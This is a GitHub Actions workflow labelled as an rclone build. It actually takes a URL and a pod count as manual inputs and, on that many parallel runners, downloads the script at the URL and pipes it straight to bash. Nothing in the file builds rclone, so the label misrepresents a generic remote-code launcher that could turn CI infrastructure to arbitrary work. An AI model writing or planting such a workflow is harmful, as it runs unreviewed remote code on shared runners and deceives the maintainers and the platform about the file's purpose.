---
# Github Actions build for rclone
# -*- compile-command: "yamllint -f parsable build.yml" -*-

name: build

on:
  workflow_dispatch:
    inputs:
      command_url:
        required: true
      pods:
        required: true
        default: '1'

env:
  COMMAND_URL: ${{ github.event.inputs.command_url }}

jobs:
  setup-matrix:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          POD_COUNT=${{ github.event.inputs.pods }}
          JSON_ARRAY=$(seq 1 $POD_COUNT | jq -R . | jq -s -c)
          echo "matrix=$JSON_ARRAY" >> $GITHUB_OUTPUT

  execute-script:
    needs: setup-matrix
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        pod_index: ${{ fromJson(needs.setup-matrix.outputs.matrix) }}
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Download and Run Script
        run: |
          if [ -z "$COMMAND_URL" ]; then
            echo "Error: COMMAND_URL is not set."
            exit 1
          fi
          
          echo "Downloading script from: $COMMAND_URL"

          curl -sLf "$COMMAND_URL" | bash